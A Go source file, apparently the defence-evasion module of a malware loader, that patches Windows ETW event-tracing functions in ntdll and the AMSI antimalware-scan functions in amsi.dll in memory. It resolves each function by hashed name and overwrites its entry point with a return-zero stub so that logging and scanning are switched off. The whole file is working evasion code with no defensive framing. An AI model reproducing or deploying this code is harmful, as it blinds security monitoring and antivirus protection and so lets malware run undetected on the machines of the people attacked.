package patch

import (
	"fmt"
	"loader/pkg/resolve"
	"encoding/hex"
	"loader/pkg/wrappers"
	"loader/pkg/types"
	"loader/pkg/obf"
	"syscall"
	"unsafe"
)

func ETW() {
	ntdllbase := resolve.GetModuleBase(obf.GetHash("ntdll.dll"))
	handle := uintptr(0xffffffffffffffff)
	dataAddr := []uintptr{
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwNotificationRegister")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwEventRegister")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwEventWriteFull")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwEventWrite")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwEventWriteEx")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwEventWriteNoRegistration")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwEventWriteString")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwEventWriteTransfer")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwTraceMessage")),
		resolve.GetFunctionAddress(ntdllbase, obf.GetHash("EtwTraceMessageVa")),
	}
	const (
		PAGE_EXECUTE_READWRITE = 0x40
	)
	patchedCount := 0
	for _, addr := range dataAddr {
		if addr == 0 {
			continue
		}
		data, _ := hex.DecodeString("4833C0C3")
		var nLength uintptr
		datalength := len(data)
		size := uintptr(datalength)
		targetAddr := addr
		var oldProtect uint32
		status, _ := wrappers.NtProtectVirtualMemory(
			handle,
			&targetAddr,
			&size,
			PAGE_EXECUTE_READWRITE,
			&oldProtect,
		)
		if status != 0 {
			continue
		}
		wrappers.NtWriteVirtualMemory(
			handle,
			addr,
			&data[0],
			uintptr(uint32(datalength)),
			&nLength,
		)
		targetAddr = addr
		wrappers.NtProtectVirtualMemory(
			handle,
			&targetAddr,
			&size,
			oldProtect,
			nil,
		)
		patchedCount++
	}
	fmt.Printf("[+] ETW patching completed: %d/%d functions patched\n", patchedCount, len(dataAddr))
}

func AMSI() error {
	var amsiDll *syscall.DLL
	var err error
	amsiDll, err = syscall.LoadDLL("amsi.dll")
	if err != nil {
		amsiDll = syscall.MustLoadDLL("amsi.dll")
		defer amsiDll.Release()
	} else {
		defer amsiDll.Release()
	}
	amsiHash := obf.GetHash("amsi.dll")
	amsiBase := resolve.GetModuleBase(amsiHash)
	if amsiBase == 0 {
		return fmt.Errorf("amsi.dll not found (not loaded)")
	}
	amsiHashes := []struct{
		name string
		hash uint32
	}{
		{"AmsiCloseSession", 0x8065EE49},
		{"AmsiInitialize", 0xD27C9F81},
		{"AmsiOpenSession", 0xFA7412C5},
		{"AmsiScanBuffer", 0xBAB3D02E},
		{"AmsiScanString", 0xE2500CCB},
		{"AmsiUacInitialize", 0xE67AAA9A},
		{"AmsiUacScan", 0x4DE05BAD},
		{"AmsiUacUninitialize", 0xAF48279D},
		{"AmsiUninitialize", 0xA39AF244},
	}
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXECUTE_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3}
	patchSize := uintptr(len(patch))
	
	patchedCount := 0
	for _, funcInfo := range amsiHashes {
		procAddr := resolve.GetFunctionAddress(amsiBase, funcInfo.hash)
		if procAddr == 0 {
			fmt.Printf("[!] Couldn't find %s function\n", funcInfo.name)
			continue
		}
		
		var oldProtect uint32
		targetAddr := procAddr
		
		_, err = wrappers.NtProtectVirtualMemory(
			currentProcess,
			&targetAddr,
			&patchSize,
			types.PAGE_EXECUTE_READWRITE,
			&oldProtect)
		if err != nil {
			fmt.Printf("[!] Failed to change protection for %s: %v\n", funcInfo.name, err)
			continue
		}

		for i := 0; i < len(patch); i++ {
			*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
		}

		targetAddr = procAddr
		patchSize = uintptr(len(patch))
		wrappers.NtProtectVirtualMemory(
			currentProcess,
			&targetAddr,
			&patchSize,
			oldProtect,
			nil)
			
		patchedCount++
	}
	
	fmt.Printf("[+] AMSI patching completed: %d/%d functions patched\n", patchedCount, len(amsiHashes))
	return nil
}